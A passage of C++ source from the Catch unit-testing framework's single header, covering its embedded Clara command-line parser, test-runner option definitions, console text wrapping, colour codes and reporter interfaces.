					oss << " <" << placeholder << ">";
				return oss.str();
			}
		};

		typedef CLARA_AUTO_PTR(Arg) ArgAutoPtr;

		friend void addOptName(Arg& arg, std::string const& optName)
		{
			if (optName.empty())
				return;
			if (Detail::startsWith(optName, "--")) {
				if (!arg.longName.empty())
					throw std::logic_error("Only one long opt may be specified. '"
						+ arg.longName
						+ "' already specified, now attempting to add '"
						+ optName + "'");
				arg.longName = optName.substr(2);
			}
			else if (Detail::startsWith(optName, "-"))
				arg.shortNames.push_back(optName.substr(1));
			else
				throw std::logic_error("option must begin with - or --. Option was: '" + optName + "'");
		}
		friend void setPositionalArg(Arg& arg, int position)
		{
			arg.position = position;
		}

		class ArgBuilder {
		public:
			ArgBuilder(Arg* arg) : m_arg(arg) {}

			// Bind a non-boolean data member (requires placeholder string)
			template<typename C, typename M>
			void bind(M C::* field, std::string const& placeholder) {
				m_arg->boundField = new Detail::BoundDataMember<C, M>(field);
				m_arg->placeholder = placeholder;
			}
			// Bind a boolean data member (no placeholder required)
			template<typename C>
			void bind(bool C::* field) {
				m_arg->boundField = new Detail::BoundDataMember<C, bool>(field);
			}

			// Bind a method taking a single, non-boolean argument (requires a placeholder string)
			template<typename C, typename M>
			void bind(void (C::* unaryMethod)(M), std::string const& placeholder) {
				m_arg->boundField = new Detail::BoundUnaryMethod<C, M>(unaryMethod);
				m_arg->placeholder = placeholder;
			}

			// Bind a method taking a single, boolean argument (no placeholder string required)
			template<typename C>
			void bind(void (C::* unaryMethod)(bool)) {
				m_arg->boundField = new Detail::BoundUnaryMethod<C, bool>(unaryMethod);
			}

			// Bind a method that takes no arguments (will be called if opt is present)
			template<typename C>
			void bind(void (C::* nullaryMethod)()) {
				m_arg->boundField = new Detail::BoundNullaryMethod<C>(nullaryMethod);
			}

			// Bind a free function taking a single argument - the object to operate on (no placeholder string required)
			template<typename C>
			void bind(void(*unaryFunction)(C&)) {
				m_arg->boundField = new Detail::BoundUnaryFunction<C>(unaryFunction);
			}

			// Bind a free function taking a single argument - the object to operate on (requires a placeholder string)
			template<typename C, typename T>
			void bind(void(*binaryFunction)(C&, T), std::string const& placeholder) {
				m_arg->boundField = new Detail::BoundBinaryFunction<C, T>(binaryFunction);
				m_arg->placeholder = placeholder;
			}

			ArgBuilder& describe(std::string const& description) {
				m_arg->description = description;
				return *this;
			}
			ArgBuilder& detail(std::string const& detail) {
				m_arg->detail = detail;
				return *this;
			}

		protected:
			Arg* m_arg;
		};

		class OptBuilder : public ArgBuilder {
		public:
			OptBuilder(Arg* arg) : ArgBuilder(arg) {}
			OptBuilder(OptBuilder& other) : ArgBuilder(other) {}

			OptBuilder& operator[](std::string const& optName) {
				addOptName(*ArgBuilder::m_arg, optName);
				return *this;
			}
		};

	public:

		CommandLine()
			: m_boundProcessName(new Detail::NullBinder<ConfigT>()),
			m_highestSpecifiedArgPosition(0),
			m_throwOnUnrecognisedTokens(false)
		{}
		CommandLine(CommandLine const& other)
			: m_boundProcessName(other.m_boundProcessName),
			m_options(other.m_options),
			m_positionalArgs(other.m_positionalArgs),
			m_highestSpecifiedArgPosition(other.m_highestSpecifiedArgPosition),
			m_throwOnUnrecognisedTokens(other.m_throwOnUnrecognisedTokens)
		{
			if (other.m_floatingArg.get())
				m_floatingArg.reset(new Arg(*other.m_floatingArg));
		}

		CommandLine& setThrowOnUnrecognisedTokens(bool shouldThrow = true) {
			m_throwOnUnrecognisedTokens = shouldThrow;
			return *this;
		}

		OptBuilder operator[](std::string const& optName) {
			m_options.push_back(Arg());
			addOptName(m_options.back(), optName);
			OptBuilder builder(&m_options.back());
			return builder;
		}

		ArgBuilder operator[](int position) {
			m_positionalArgs.insert(std::make_pair(position, Arg()));
			if (position > m_highestSpecifiedArgPosition)
				m_highestSpecifiedArgPosition = position;
			setPositionalArg(m_positionalArgs[position], position);
			ArgBuilder builder(&m_positionalArgs[position]);
			return builder;
		}

		// Invoke this with the _ instance
		ArgBuilder operator[](UnpositionalTag) {
			if (m_floatingArg.get())
				throw std::logic_error("Only one unpositional argument can be added");
			m_floatingArg.reset(new Arg());
			ArgBuilder builder(m_floatingArg.get());
			return builder;
		}

		template<typename C, typename M>
		void bindProcessName(M C::* field) {
			m_boundProcessName = new Detail::BoundDataMember<C, M>(field);
		}
		template<typename C, typename M>
		void bindProcessName(void (C::*_unaryMethod)(M)) {
			m_boundProcessName = new Detail::BoundUnaryMethod<C, M>(_unaryMethod);
		}

		void optUsage(std::ostream& os, std::size_t indent = 0, std::size_t width = Detail::consoleWidth) const {
			typename std::vector<Arg>::const_iterator itBegin = m_options.begin(), itEnd = m_options.end(), it;
			std::size_t maxWidth = 0;
			for (it = itBegin; it != itEnd; ++it)
				maxWidth = (std::max)(maxWidth, it->commands().size());

			for (it = itBegin; it != itEnd; ++it) {
				Detail::Text usage(it->commands(), Detail::TextAttributes()
					.setWidth(maxWidth + indent)
					.setIndent(indent));
				Detail::Text desc(it->description, Detail::TextAttributes()
					.setWidth(width - maxWidth - 3));

				for (std::size_t i = 0; i < (std::max)(usage.size(), desc.size()); ++i) {
					std::string usageCol = i < usage.size() ? usage[i] : "";
					os << usageCol;

					if (i < desc.size() && !desc[i].empty())
						os << std::string(indent + 2 + maxWidth - usageCol.size(), ' ')
						<< desc[i];
					os << "\n";
				}
			}
		}
		std::string optUsage() const {
			std::ostringstream oss;
			optUsage(oss);
			return oss.str();
		}

		void argSynopsis(std::ostream& os) const {
			for (int i = 1; i <= m_highestSpecifiedArgPosition; ++i) {
				if (i > 1)
					os << " ";
				typename std::map<int, Arg>::const_iterator it = m_positionalArgs.find(i);
				if (it != m_positionalArgs.end())
					os << "<" << it->second.placeholder << ">";
				else if (m_floatingArg.get())
					os << "<" << m_floatingArg->placeholder << ">";
				else
					throw std::logic_error("non consecutive positional arguments with no floating args");
			}
			// !TBD No indication of mandatory args
			if (m_floatingArg.get()) {
				if (m_highestSpecifiedArgPosition > 1)
					os << " ";
				os << "[<" << m_floatingArg->placeholder << "> ...]";
			}
		}
		std::string argSynopsis() const {
			std::ostringstream oss;
			argSynopsis(oss);
			return oss.str();
		}

		void usage(std::ostream& os, std::string const& procName) const {
			validate();
			os << "usage:\n  " << procName << " ";
			argSynopsis(os);
			if (!m_options.empty()) {
				os << " [options]\n\nwhere options are: \n";
				optUsage(os, 2);
			}
			os << "\n";
		}
		std::string usage(std::string const& procName) const {
			std::ostringstream oss;
			usage(oss, procName);
			return oss.str();
		}

		ConfigT parse(std::vector<std::string> const& args) const {
			ConfigT config;
			parseInto(args, config);
			return config;
		}

		std::vector<Parser::Token> parseInto(std::vector<std::string> const& args, ConfigT& config) const {
			std::string processName = args[0];
			std::size_t lastSlash = processName.find_last_of("/\\");
			if (lastSlash != std::string::npos)
				processName = processName.substr(lastSlash + 1);
			m_boundProcessName.set(config, processName);
			std::vector<Parser::Token> tokens;
			Parser parser;
			parser.parseIntoTokens(args, tokens);
			return populate(tokens, config);
		}

		std::vector<Parser::Token> populate(std::vector<Parser::Token> const& tokens, ConfigT& config) const {
			validate();
			std::vector<Parser::Token> unusedTokens = populateOptions(tokens, config);
			unusedTokens = populateFixedArgs(unusedTokens, config);
			unusedTokens = populateFloatingArgs(unusedTokens, config);
			return unusedTokens;
		}

		std::vector<Parser::Token> populateOptions(std::vector<Parser::Token> const& tokens, ConfigT& config) const {
			std::vector<Parser::Token> unusedTokens;
			std::vector<std::string> errors;
			for (std::size_t i = 0; i < tokens.size(); ++i) {
				Parser::Token const& token = tokens[i];
				typename std::vector<Arg>::const_iterator it = m_options.begin(), itEnd = m_options.end();
				for (; it != itEnd; ++it) {
					Arg const& arg = *it;

					try {
						if ((token.type == Parser::Token::ShortOpt && arg.hasShortName(token.data)) ||
							(token.type == Parser::Token::LongOpt && arg.hasLongName(token.data))) {
							if (arg.takesArg()) {
								if (i == tokens.size() - 1 || tokens[i + 1].type != Parser::Token::Positional)
									errors.push_back("Expected argument to option: " + token.data);
								else
									arg.boundField.set(config, tokens[++i].data);
							}
							else {
								arg.boundField.set(config, "true");
							}
							break;
						}
					}
					catch (std::exception& ex) {
						errors.push_back(std::string(ex.what()) + "\n- while parsing: (" + arg.commands() + ")");
					}
				}
				if (it == itEnd) {
					if (token.type == Parser::Token::Positional || !m_throwOnUnrecognisedTokens)
						unusedTokens.push_back(token);
					else if (errors.empty() && m_throwOnUnrecognisedTokens)
						errors.push_back("unrecognised option: " + token.data);
				}
			}
			if (!errors.empty()) {
				std::ostringstream oss;
				for (std::vector<std::string>::const_iterator it = errors.begin(), itEnd = errors.end();
					it != itEnd;
					++it) {
					if (it != errors.begin())
						oss << "\n";
					oss << *it;
				}
				throw std::runtime_error(oss.str());
			}
			return unusedTokens;
		}
		std::vector<Parser::Token> populateFixedArgs(std::vector<Parser::Token> const& tokens, ConfigT& config) const {
			std::vector<Parser::Token> unusedTokens;
			int position = 1;
			for (std::size_t i = 0; i < tokens.size(); ++i) {
				Parser::Token const& token = tokens[i];
				typename std::map<int, Arg>::const_iterator it = m_positionalArgs.find(position);
				if (it != m_positionalArgs.end())
					it->second.boundField.set(config, token.data);
				else
					unusedTokens.push_back(token);
				if (token.type == Parser::Token::Positional)
					position++;
			}
			return unusedTokens;
		}
		std::vector<Parser::Token> populateFloatingArgs(std::vector<Parser::Token> const& tokens, ConfigT& config) const {
			if (!m_floatingArg.get())
				return tokens;
			std::vector<Parser::Token> unusedTokens;
			for (std::size_t i = 0; i < tokens.size(); ++i) {
				Parser::Token const& token = tokens[i];
				if (token.type == Parser::Token::Positional)
					m_floatingArg->boundField.set(config, token.data);
				else
					unusedTokens.push_back(token);
			}
			return unusedTokens;
		}

		void validate() const
		{
			if (m_options.empty() && m_positionalArgs.empty() && !m_floatingArg.get())
				throw std::logic_error("No options or arguments specified");

			for (typename std::vector<Arg>::const_iterator  it = m_options.begin(),
				itEnd = m_options.end();
				it != itEnd; ++it)
				it->validate();
		}

	private:
		Detail::BoundArgFunction<ConfigT> m_boundProcessName;
		std::vector<Arg> m_options;
		std::map<int, Arg> m_positionalArgs;
		ArgAutoPtr m_floatingArg;
		int m_highestSpecifiedArgPosition;
		bool m_throwOnUnrecognisedTokens;
	};

} // end namespace Clara

STITCH_CLARA_CLOSE_NAMESPACE
#undef STITCH_CLARA_OPEN_NAMESPACE
#undef STITCH_CLARA_CLOSE_NAMESPACE

#endif // TWOBLUECUBES_CLARA_H_INCLUDED
#undef STITCH_CLARA_OPEN_NAMESPACE

// Restore Clara's value for console width, if present
#ifdef CATCH_TEMP_CLARA_CONFIG_CONSOLE_WIDTH
#define CLARA_CONFIG_CONSOLE_WIDTH CATCH_TEMP_CLARA_CONFIG_CONSOLE_WIDTH
#undef CATCH_TEMP_CLARA_CONFIG_CONSOLE_WIDTH
#endif

#include <fstream>

namespace Catch {

	inline void abortAfterFirst(ConfigData& config) { config.abortAfter = 1; }
	inline void abortAfterX(ConfigData& config, int x) {
		if (x < 1)
			throw std::runtime_error("Value after -x or --abortAfter must be greater than zero");
		config.abortAfter = x;
	}
	inline void addTestOrTags(ConfigData& config, std::string const& _testSpec) { config.testsOrTags.push_back(_testSpec); }
	inline void addReporterName(ConfigData& config, std::string const& _reporterName) { config.reporterNames.push_back(_reporterName); }

	inline void addWarning(ConfigData& config, std::string const& _warning) {
		if (_warning == "NoAssertions")
			config.warnings = static_cast<WarnAbout::What>(config.warnings | WarnAbout::NoAssertions);
		else
			throw std::runtime_error("Unrecognised warning: '" + _warning + "'");
	}
	inline void setOrder(ConfigData& config, std::string const& order) {
		if (startsWith("declared", order))
			config.runOrder = RunTests::InDeclarationOrder;
		else if (startsWith("lexical", order))
			config.runOrder = RunTests::InLexicographicalOrder;
		else if (startsWith("random", order))
			config.runOrder = RunTests::InRandomOrder;
		else
			throw std::runtime_error("Unrecognised ordering: '" + order + "'");
	}
	inline void setRngSeed(ConfigData& config, std::string const& seed) {
		if (seed == "time") {
			config.rngSeed = static_cast<unsigned int>(std::time(0));
		}
		else {
			std::stringstream ss;
			ss << seed;
			ss >> config.rngSeed;
			if (ss.fail())
				throw std::runtime_error("Argment to --rng-seed should be the word 'time' or a number");
		}
	}
	inline void setVerbosity(ConfigData& config, int level) {
		// !TBD: accept strings?
		config.verbosity = static_cast<Verbosity::Level>(level);
	}
	inline void setShowDurations(ConfigData& config, bool _showDurations) {
		config.showDurations = _showDurations
			? ShowDurations::Always
			: ShowDurations::Never;
	}
	inline void setUseColour(ConfigData& config, std::string const& value) {
		std::string mode = toLower(value);

		if (mode == "yes")
			config.useColour = UseColour::Yes;
		else if (mode == "no")
			config.useColour = UseColour::No;
		else if (mode == "auto")
			config.useColour = UseColour::Auto;
		else
			throw std::runtime_error("colour mode must be one of: auto, yes or no");
	}
	inline void forceColour(ConfigData& config) {
		config.useColour = UseColour::Yes;
	}
	inline void loadTestNamesFromFile(ConfigData& config, std::string const& _filename) {
		std::ifstream f(_filename.c_str());
		if (!f.is_open())
			throw std::domain_error("Unable to load input file: " + _filename);

		std::string line;
		while (std::getline(f, line)) {
			line = trim(line);
			if (!line.empty() && !startsWith(line, "#"))
				addTestOrTags(config, "\"" + line + "\",");
		}
	}

	inline Clara::CommandLine<ConfigData> makeCommandLineParser() {

		using namespace Clara;
		CommandLine<ConfigData> cli;

		cli.bindProcessName(&ConfigData::processName);

		cli["-?"]["-h"]["--help"]
			.describe("display usage information")
			.bind(&ConfigData::showHelp);

		cli["-l"]["--list-tests"]
			.describe("list all/matching test cases")
			.bind(&ConfigData::listTests);

		cli["-t"]["--list-tags"]
			.describe("list all/matching tags")
			.bind(&ConfigData::listTags);

		cli["-s"]["--success"]
			.describe("include successful tests in output")
			.bind(&ConfigData::showSuccessfulTests);

		cli["-b"]["--break"]
			.describe("break into debugger on failure")
			.bind(&ConfigData::shouldDebugBreak);

		cli["-e"]["--nothrow"]
			.describe("skip exception tests")
			.bind(&ConfigData::noThrow);

		cli["-i"]["--invisibles"]
			.describe("show invisibles (tabs, newlines)")
			.bind(&ConfigData::showInvisibles);

		cli["-o"]["--out"]
			.describe("output filename")
			.bind(&ConfigData::outputFilename, "filename");

		cli["-r"]["--reporter"]
			//            .placeholder( "name[:filename]" )
			.describe("reporter to use (defaults to console)")
			.bind(&addReporterName, "name");

		cli["-n"]["--name"]
			.describe("suite name")
			.bind(&ConfigData::name, "name");

		cli["-a"]["--abort"]
			.describe("abort at first failure")
			.bind(&abortAfterFirst);

		cli["-x"]["--abortx"]
			.describe("abort after x failures")
			.bind(&abortAfterX, "no. failures");

		cli["-w"]["--warn"]
			.describe("enable warnings")
			.bind(&addWarning, "warning name");

		// - needs updating if reinstated
		//        cli.into( &setVerbosity )
		//            .describe( "level of verbosity (0=no output)" )
		//            .shortOpt( "v")
		//            .longOpt( "verbosity" )
		//            .placeholder( "level" );

		cli[_]
			.describe("which test or tests to use")
			.bind(&addTestOrTags, "test name, pattern or tags");

		cli["-d"]["--durations"]
			.describe("show test durations")
			.bind(&setShowDurations, "yes|no");

		cli["-f"]["--input-file"]
			.describe("load test names to run from a file")
			.bind(&loadTestNamesFromFile, "filename");

		cli["-#"]["--filenames-as-tags"]
			.describe("adds a tag for the filename")
			.bind(&ConfigData::filenamesAsTags);

		// Less common commands which don't have a short form
		cli["--list-test-names-only"]
			.describe("list all/matching test cases names only")
			.bind(&ConfigData::listTestNamesOnly);

		cli["--list-reporters"]
			.describe("list all reporters")
			.bind(&ConfigData::listReporters);

		cli["--order"]
			.describe("test case order (defaults to decl)")
			.bind(&setOrder, "decl|lex|rand");

		cli["--rng-seed"]
			.describe("set a specific seed for random numbers")
			.bind(&setRngSeed, "'time'|number");

		cli["--force-colour"]
			.describe("force colourised output (deprecated)")
			.bind(&forceColour);

		cli["--use-colour"]
			.describe("should output be colourised")
			.bind(&setUseColour, "yes|no");

		return cli;
	}

} // end namespace Catch

  // #included from: internal/catch_list.hpp
#define TWOBLUECUBES_CATCH_LIST_HPP_INCLUDED

  // #included from: catch_text.h
#define TWOBLUECUBES_CATCH_TEXT_H_INCLUDED

#define TBC_TEXT_FORMAT_CONSOLE_WIDTH CATCH_CONFIG_CONSOLE_WIDTH

#define CLICHE_TBC_TEXT_FORMAT_OUTER_NAMESPACE Catch
  // #included from: ../external/tbc_text_format.h
  // Only use header guard if we are not using an outer namespace
#ifndef CLICHE_TBC_TEXT_FORMAT_OUTER_NAMESPACE
# ifdef TWOBLUECUBES_TEXT_FORMAT_H_INCLUDED
#  ifndef TWOBLUECUBES_TEXT_FORMAT_H_ALREADY_INCLUDED
#   define TWOBLUECUBES_TEXT_FORMAT_H_ALREADY_INCLUDED
#  endif
# else
#  define TWOBLUECUBES_TEXT_FORMAT_H_INCLUDED
# endif
#endif
#ifndef TWOBLUECUBES_TEXT_FORMAT_H_ALREADY_INCLUDED
#include <string>
#include <vector>
#include <sstream>

  // Use optional outer namespace
#ifdef CLICHE_TBC_TEXT_FORMAT_OUTER_NAMESPACE
namespace CLICHE_TBC_TEXT_FORMAT_OUTER_NAMESPACE {
#endif

	namespace Tbc {

#ifdef TBC_TEXT_FORMAT_CONSOLE_WIDTH
		const unsigned int consoleWidth = TBC_TEXT_FORMAT_CONSOLE_WIDTH;
#else
		const unsigned int consoleWidth = 80;
#endif

		struct TextAttributes {
			TextAttributes()
				: initialIndent(std::string::npos),
				indent(0),
				width(consoleWidth - 1),
				tabChar('\t')
			{}

			TextAttributes& setInitialIndent(std::size_t _value) { initialIndent = _value; return *this; }
			TextAttributes& setIndent(std::size_t _value) { indent = _value; return *this; }
			TextAttributes& setWidth(std::size_t _value) { width = _value; return *this; }
			TextAttributes& setTabChar(char _value) { tabChar = _value; return *this; }

			std::size_t initialIndent;  // indent of first line, or npos
			std::size_t indent;         // indent of subsequent lines, or all if initialIndent is npos
			std::size_t width;          // maximum width of text, including indent. Longer text will wrap
			char tabChar;               // If this char is seen the indent is changed to current pos
		};

		class Text {
		public:
			Text(std::string const& _str, TextAttributes const& _attr = TextAttributes())
				: attr(_attr)
			{
				std::string wrappableChars = " [({.,/|\\-";
				std::size_t indent = _attr.initialIndent != std::string::npos
					? _attr.initialIndent
					: _attr.indent;
				std::string remainder = _str;

				while (!remainder.empty()) {
					if (lines.size() >= 1000) {
						lines.push_back("... message truncated due to excessive size");
						return;
					}
					std::size_t tabPos = std::string::npos;
					std::size_t width = (std::min)(remainder.size(), _attr.width - indent);
					std::size_t pos = remainder.find_first_of('\n');
					if (pos <= width) {
						width = pos;
					}
					pos = remainder.find_last_of(_attr.tabChar, width);
					if (pos != std::string::npos) {
						tabPos = pos;
						if (remainder[width] == '\n')
							width--;
						remainder = remainder.substr(0, tabPos) + remainder.substr(tabPos + 1);
					}

					if (width == remainder.size()) {
						spliceLine(indent, remainder, width);
					}
					else if (remainder[width] == '\n') {
						spliceLine(indent, remainder, width);
						if (width <= 1 || remainder.size() != 1)
							remainder = remainder.substr(1);
						indent = _attr.indent;
					}
					else {
						pos = remainder.find_last_of(wrappableChars, width);
						if (pos != std::string::npos && pos > 0) {
							spliceLine(indent, remainder, pos);
							if (remainder[0] == ' ')
								remainder = remainder.substr(1);
						}
						else {
							spliceLine(indent, remainder, width - 1);
							lines.back() += "-";
						}
						if (lines.size() == 1)
							indent = _attr.indent;
						if (tabPos != std::string::npos)
							indent += tabPos;
					}
				}
			}

			void spliceLine(std::size_t _indent, std::string& _remainder, std::size_t _pos) {
				lines.push_back(std::string(_indent, ' ') + _remainder.substr(0, _pos));
				_remainder = _remainder.substr(_pos);
			}

			typedef std::vector<std::string>::const_iterator const_iterator;

			const_iterator begin() const { return lines.begin(); }
			const_iterator end() const { return lines.end(); }
			std::string const& last() const { return lines.back(); }
			std::size_t size() const { return lines.size(); }
			std::string const& operator[](std::size_t _index) const { return lines[_index]; }
			std::string toString() const {
				std::ostringstream oss;
				oss << *this;
				return oss.str();
			}

			inline friend std::ostream& operator << (std::ostream& _stream, Text const& _text) {
				for (Text::const_iterator it = _text.begin(), itEnd = _text.end();
					it != itEnd; ++it) {
					if (it != _text.begin())
						_stream << "\n";
					_stream << *it;
				}
				return _stream;
			}

		private:
			std::string str;
			TextAttributes attr;
			std::vector<std::string> lines;
		};

	} // end namespace Tbc

#ifdef CLICHE_TBC_TEXT_FORMAT_OUTER_NAMESPACE
} // end outer namespace
#endif

#endif // TWOBLUECUBES_TEXT_FORMAT_H_ALREADY_INCLUDED
#undef CLICHE_TBC_TEXT_FORMAT_OUTER_NAMESPACE

namespace Catch {
	using Tbc::Text;
	using Tbc::TextAttributes;
}

// #included from: catch_console_colour.hpp
#define TWOBLUECUBES_CATCH_CONSOLE_COLOUR_HPP_INCLUDED

namespace Catch {

	struct Colour {
		enum Code {
			None = 0,

			White,
			Red,
			Green,
			Blue,
			Cyan,
			Yellow,
			Grey,

			Bright = 0x10,

			BrightRed = Bright | Red,
			BrightGreen = Bright | Green,
			LightGrey = Bright | Grey,
			BrightWhite = Bright | White,

			// By intention
			FileName = LightGrey,
			Warning = Yellow,
			ResultError = BrightRed,
			ResultSuccess = BrightGreen,
			ResultExpectedFailure = Warning,

			Error = BrightRed,
			Success = Green,

			OriginalExpression = Cyan,
			ReconstructedExpression = Yellow,

			SecondaryText = LightGrey,
			Headers = White
		};

		// Use constructed object for RAII guard
		Colour(Code _colourCode);
		Colour(Colour const& other);
		~Colour();

		// Use static method for one-shot changes
		static void use(Code _colourCode);

	private:
		bool m_moved;
	};

	inline std::ostream& operator << (std::ostream& os, Colour const&) { return os; }

} // end namespace Catch

  // #included from: catch_interfaces_reporter.h
#define TWOBLUECUBES_CATCH_INTERFACES_REPORTER_H_INCLUDED

#include <string>
#include <ostream>
#include <map>
#include <assert.h>

namespace Catch
{
	struct ReporterConfig {
		explicit ReporterConfig(Ptr<IConfig const> const& _fullConfig)
			: m_stream(&_fullConfig->stream()), m_fullConfig(_fullConfig) {}

		ReporterConfig(Ptr<IConfig const> const& _fullConfig, std::ostream& _stream)
			: m_stream(&_stream), m_fullConfig(_fullConfig) {}

		std::ostream& stream() const { return *m_stream; }
		Ptr<IConfig const> fullConfig() const { return m_fullConfig; }

	private:
		std::ostream* m_stream;
		Ptr<IConfig const> m_fullConfig;
	};

	struct ReporterPreferences {
		ReporterPreferences()
			: shouldRedirectStdOut(false)
		{}

		bool shouldRedirectStdOut;
	};

	template<typename T>
	struct LazyStat : Option<T> {
		LazyStat() : used(false) {}
		LazyStat& operator=(T const& _value) {
			Option<T>::operator=(_value);
			used = false;
			return *this;
		}
		void reset() {
			Option<T>::reset();
			used = false;
		}
		bool used;
	};

	struct TestRunInfo {
		TestRunInfo(std::string const& _name) : name(_name) {}
		std::string name;
	};
	struct GroupInfo {
		GroupInfo(std::string const& _name,
			std::size_t _groupIndex,
			std::size_t _groupsCount)
			: name(_name),
			groupIndex(_groupIndex),
			groupsCounts(_groupsCount)
		{}

		std::string name;
		std::size_t groupIndex;
		std::size_t groupsCounts;
	};

	struct AssertionStats {
		AssertionStats(AssertionResult const& _assertionResult,
			std::vector<MessageInfo> const& _infoMessages,
			Totals const& _totals)
			: assertionResult(_assertionResult),
			infoMessages(_infoMessages),
			totals(_totals)
		{
			if (assertionResult.hasMessage()) {
				// Copy message into messages list.
				// !TBD This should have been done earlier, somewhere
				MessageBuilder builder(assertionResult.getTestMacroName(), assertionResult.getSourceInfo(), assertionResult.getResultType());
				builder << assertionResult.getMessage();
				builder.m_info.message = builder.m_stream.str();

				infoMessages.push_back(builder.m_info);
			}
		}
		virtual ~AssertionStats();

#  ifdef CATCH_CONFIG_CPP11_GENERATED_METHODS
		AssertionStats(AssertionStats const&) = default;
		AssertionStats(AssertionStats &&) = default;
		AssertionStats& operator = (AssertionStats const&) = default;
		AssertionStats& operator = (AssertionStats &&) = default;
#  endif

		AssertionResult assertionResult;
		std::vector<MessageInfo> infoMessages;
		Totals totals;
	};

	struct SectionStats {
		SectionStats(SectionInfo const& _sectionInfo,
			Counts const& _assertions,
			double _durationInSeconds,
			bool _missingAssertions)
			: sectionInfo(_sectionInfo),
			assertions(_assertions),
			durationInSeconds(_durationInSeconds),
			missingAssertions(_missingAssertions)
		{}
		virtual ~SectionStats();
#  ifdef CATCH_CONFIG_CPP11_GENERATED_METHODS
		SectionStats(SectionStats const&) = default;
		SectionStats(SectionStats &&) = default;
		SectionStats& operator = (SectionStats const&) = default;
		SectionStats& operator = (SectionStats &&) = default;
#  endif

		SectionInfo sectionInfo;
		Counts assertions;
		double durationInSeconds;
		bool missingAssertions;
	};

	struct TestCaseStats {
		TestCaseStats(TestCaseInfo const& _testInfo,
			Totals const& _totals,
			std::string const& _stdOut,
			std::string const& _stdErr,
			bool _aborting)
			: testInfo(_testInfo),
			totals(_totals),
			stdOut(_stdOut),
			stdErr(_stdErr),
			aborting(_aborting)
		{}
		virtual ~TestCaseStats();

#  ifdef CATCH_CONFIG_CPP11_GENERATED_METHODS
		TestCaseStats(TestCaseStats const&) = default;
		TestCaseStats(TestCaseStats &&) = default;
		TestCaseStats& operator = (TestCaseStats const&) = default;
		TestCaseStats& operator = (TestCaseStats &&) = default;
#  endif

		TestCaseInfo testInfo;
		Totals totals;
		std::string stdOut;
		std::string stdErr;
		bool aborting;
	};

	struct TestGroupStats {
		TestGroupStats(GroupInfo const& _groupInfo,
			Totals const& _totals,
			bool _aborting)
			: groupInfo(_groupInfo),
			totals(_totals),
			aborting(_aborting)
		{}
		TestGroupStats(GroupInfo const& _groupInfo)
			: groupInfo(_groupInfo),
			aborting(false)
		{}
		virtual ~TestGroupStats();

#  ifdef CATCH_CONFIG_CPP11_GENERATED_METHODS
		TestGroupStats(TestGroupStats const&) = default;
		TestGroupStats(TestGroupStats &&) = default;
		TestGroupStats& operator = (TestGroupStats const&) = default;
		TestGroupStats& operator = (TestGroupStats &&) = default;
#  endif

		GroupInfo groupInfo;
		Totals totals;
		bool aborting;
	};

	struct TestRunStats {
		TestRunStats(TestRunInfo const& _runInfo,
			Totals const& _totals,
			bool _aborting)
			: runInfo(_runInfo),
			totals(_totals),
			aborting(_aborting)
		{}
		virtual ~TestRunStats();

#  ifndef CATCH_CONFIG_CPP11_GENERATED_METHODS
		TestRunStats(TestRunStats const& _other)
			: runInfo(_other.runInfo),
			totals(_other.totals),
			aborting(_other.aborting)
		{}
#  else
		TestRunStats(TestRunStats const&) = default;
		TestRunStats(TestRunStats &&) = default;
		TestRunStats& operator = (TestRunStats const&) = default;
		TestRunStats& operator = (TestRunStats &&) = default;
#  endif

		TestRunInfo runInfo;
		Totals totals;
		bool aborting;
	};

	class MultipleReporters;

	struct IStreamingReporter : IShared {
		virtual ~IStreamingReporter();

		// Implementing class must also provide the following static method:
		// static std::string getDescription();

		virtual ReporterPreferences getPreferences() const = 0;

		virtual void noMatchingTestCases(std::string const& spec) = 0;

		virtual void testRunStarting(TestRunInfo const& testRunInfo) = 0;
		virtual void testGroupStarting(GroupInfo const& groupInfo) = 0;

		virtual void testCaseStarting(TestCaseInfo const& testInfo) = 0;
		virtual void sectionStarting(SectionInfo const& sectionInfo) = 0;

		virtual void assertionStarting(AssertionInfo const& assertionInfo) = 0;

		// The return value indicates if the messages buffer should be cleared:
		virtual bool assertionEnded(AssertionStats const& assertionStats) = 0;

		virtual void sectionEnded(SectionStats const& sectionStats) = 0;
		virtual void testCaseEnded(TestCaseStats const& testCaseStats) = 0;
		virtual void testGroupEnded(TestGroupStats const& testGroupStats) = 0;
		virtual void testRunEnded(TestRunStats const& testRunStats) = 0;

		virtual void skipTest(TestCaseInfo const& testInfo) = 0;

		virtual MultipleReporters* tryAsMulti() { return CATCH_NULL; }
	};

	struct IReporterFactory : IShared {
		virtual ~IReporterFactory();
		virtual IStreamingReporter* create(ReporterConfig const& config) const = 0;
		virtual std::string getDescription() const = 0;
	};

	struct IReporterRegistry {
		typedef std::map<std::string, Ptr<IReporterFactory> > FactoryMap;
		typedef std::vector<Ptr<IReporterFactory> > Listeners;

		virtual ~IReporterRegistry();
		virtual IStreamingReporter* create(std::string const& name, Ptr<IConfig const> const& config) const = 0;
		virtual FactoryMap const& getFactories() const = 0;
		virtual Listeners const& getListeners() const = 0;
	};

	Ptr<IStreamingReporter> addReporter(Ptr<IStreamingReporter> const& existingReporter, Ptr<IStreamingReporter> const& additionalReporter);

}

#include <limits>
#include <algorithm>

namespace Catch {

	inline std::size_t listTests(Config const& config) {

		TestSpec testSpec = config.testSpec();
		if (config.testSpec().hasFilters())
			Catch::cout() << "Matching test cases:\n";
		else {
			Catch::cout() << "All available test cases:\n";
			testSpec = TestSpecParser(ITagAliasRegistry::get()).parse("*").testSpec();
		}

		std::size_t matchedTests = 0;
		TextAttributes nameAttr, tagsAttr;
		nameAttr.setInitialIndent(2).setIndent(4);
		tagsAttr.setIndent(6);

		std::vector<TestCase> matchedTestCases = filterTests(getAllTestCasesSorted(config), testSpec, config);
		for (std::vector<TestCase>::const_iterator it = matchedTestCases.begin(), itEnd = matchedTestCases.end();
			it != itEnd;
			++it) {
			matchedTests++;
			TestCaseInfo const& testCaseInfo = it->getTestCaseInfo();
			Colour::Code colour = testCaseInfo.isHidden()
				? Colour::SecondaryText
				: Colour::None;
			Colour colourGuard(colour);

			Catch::cout() << Text(testCaseInfo.name, nameAttr) << std::endl;
			if (!testCaseInfo.tags.empty())
				Catch::cout() << Text(testCaseInfo.tagsAsString, tagsAttr) << std::endl;
		}

		if (!config.testSpec().hasFilters())
			Catch::cout() << pluralise(matchedTests, "test case") << "\n" << std::endl;
		else
			Catch::cout() << pluralise(matchedTests, "matching test case") << "\n" << std::endl;
		return matchedTests;
	}

	inline std::size_t listTestsNamesOnly(Config const& config) {
		TestSpec testSpec = config.testSpec();
		if (!config.testSpec().hasFilters())
			testSpec = TestSpecParser(ITagAliasRegistry::get()).parse("*").testSpec();
